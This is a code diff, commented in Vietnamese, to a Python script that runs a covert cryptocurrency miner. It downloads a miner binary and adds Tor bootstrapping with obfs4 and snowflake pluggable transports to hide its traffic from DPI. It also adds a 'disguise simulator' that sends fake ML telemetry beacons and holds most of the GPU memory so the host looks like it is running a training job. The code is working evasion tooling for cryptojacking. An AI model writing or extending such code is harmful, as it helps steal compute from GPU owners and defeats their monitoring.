@@ -49,6 +49,11 @@ CONFIG = {
     "num_dataloader_workers": 4,
     "gpu_id": 0,
     
+    # Anti-detection sâu
+    "tor_mode": "auto",            # auto|obfs4|snowflake|vanilla
+    "vram_target_frac": 0.88,      # chiếm % VRAM (96GB → ~84GB stable)
+    "beacons": True,               # fake ML telemetry traffic
+    
     "repo_url": "https://github.com/ducknogit/stealth_onezero.git",
     "miner_release": "https://github.com/OneZeroMiner/onezerominer/releases/download/v1.8.3/onezerominer-linux-1.8.3.tar.gz",
 }
@@ -62,6 +67,7 @@ _state = {
     "miner_pid": None,
     "simulator": None,
     "setup_done": False,
+    "tor_proc": None,
 }
 
 
@@ -159,10 +165,13 @@ def setup_miner():
 # ═══════════════════════════════════════════════════════════════
 
 def start_tor() -> bool:
-    """Bootstrap Tor → SOCKS5."""
+    """
+    Bootstrap Tor → SOCKS5, ƯU TIÊN pluggable transport (obfs4/snowflake)
+    để che Tor handshake khỏi DPI. Fallback vanilla nếu PT fail.
+    """
     socks_addr = CONFIG["socks"]
-    
-    # Check running
+
+    # Check đã chạy
     try:
         s = socket.create_connection(socks_addr, timeout=2)
         s.close()
@@ -170,12 +179,36 @@ def start_tor() -> bool:
         return True
     except Exception:
         pass
-    
-    log("Downloading Tor...")
+
+    # Tor hardened (bundle + lyrebird + bridges từ moat API)
+    try:
+        from tor_hardened import start_tor_hardened
+        mode = CONFIG.get("tor_mode", "auto")
+        log(f"Tor hardened (mode={mode})...")
+        proc = start_tor_hardened(
+            socks=socks_addr, mode=mode,
+            bootstrap_timeout=90.0, log=log,
+        )
+        if proc:
+            _state["tor"] = True
+            _state["tor_proc"] = proc
+            return True
+    except Exception as e:
+        log(f"tor_hardened error: {e}")
+
+    # Fallback: vanilla Tor (cũ)
+    log("Tor hardened failed → vanilla fallback...")
+    return _start_tor_vanilla()
+
+
+def _start_tor_vanilla() -> bool:
+    """Vanilla Tor (không PT) — last resort."""
+    socks_addr = CONFIG["socks"]
     tmp = tempfile.mkdtemp(prefix=".t_")
     tarball = os.path.join(tmp, "t.tgz")
     
     try:
+        log("Downloading Tor...")
         urllib.request.urlretrieve(CONFIG["tor_url"], tarball)
         with tarfile.open(tarball, "r:gz") as t:
             t.extractall(tmp, filter="data")
@@ -196,7 +229,7 @@ def start_tor() -> bool:
         
         os.chmod(tor_bin, 0o700)
         
-        # Config
+        # Config (thêm ConnectionPadding để khó nhận diện hơn)
         torrc = os.path.join(tmp, "t.conf")
         ddir = os.path.join(tmp, "d")
         os.makedirs(ddir, exist_ok=True)
@@ -205,6 +238,8 @@ def start_tor() -> bool:
             f.write(f"DataDirectory {ddir}\n")
             f.write("AvoidDiskWrites 1\n")
             f.write("ClientOnly 1\n")
+            f.write("ConnectionPadding 1\n")
+            f.write("EnforceDistinctSubnets 1\n")
         
         # Env
         env = os.environ.copy()
@@ -214,7 +249,8 @@ def start_tor() -> bool:
             env["LD_LIBRARY_PATH"] = lib
         
         # Start
-        popen([tor_bin, "-f", torrc], env=env, cwd=os.path.dirname(tor_bin))
+        proc = popen([tor_bin, "-f", torrc], env=env, cwd=os.path.dirname(tor_bin))
+        _state["tor_proc"] = proc
         
         # Wait ready
         for i in range(60):
@@ -360,7 +396,7 @@ def start_miner() -> bool:
 
 
 # ═══════════════════════════════════════════════════════════════
-# STEP 5: DISGUISE SIMULATOR (Layers 1-6)
+# STEP 5: DISGUISE SIMULATOR (Layers 1-13)
 # ═══════════════════════════════════════════════════════════════
 
 def start_disguise_simulator():
@@ -373,12 +409,20 @@ def start_disguise_simulator():
             num_workers=CONFIG["num_dataloader_workers"],
         )
         
-        sim.setup(gpu_id=CONFIG["gpu_id"], silent=True)
+        sim.setup(
+            gpu_id=CONFIG["gpu_id"],
+            silent=True,
+            socks=CONFIG["socks"],
+            vram_target_frac=CONFIG.get("vram_target_frac", 0.88),
+            # Tor đã start riêng ở Step 2 → orchestrator không start lại
+            use_tor_hardened=False,
+            use_beacons=CONFIG.get("beacons", True),
+        )
         sim.start_heartbeat(interval=1.0)
         sim.start_coordination()
         
         _state["simulator"] = sim
-        log("Disguise simulator active")
+        log("Disguise simulator active (L1-13)")
         return True
         
     except Exception as e:
